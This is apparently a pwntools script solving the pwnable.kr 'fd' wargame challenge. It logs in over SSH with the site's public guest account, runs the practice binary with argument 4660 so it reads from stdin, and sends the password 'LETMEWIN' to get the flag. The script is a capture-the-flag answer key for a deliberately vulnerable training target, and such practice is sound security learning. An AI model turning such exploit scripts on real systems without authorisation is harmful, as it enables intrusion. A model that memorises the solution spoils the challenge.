from pwn import *

r = ssh(user = 'fd', host='pwnable.kr', port=2222, password='guest')

#___________________________________________1__________________________
process = r.process(executable='./fd', argv=['fd','4660'])
process.sendline('LETMEWIN')
print(process.recvlines(2))
#___________________________________________2__________________________
p = r.process(['./fd', '4660'])
p.sendline('LETMEWIN')
print(p.recvall())
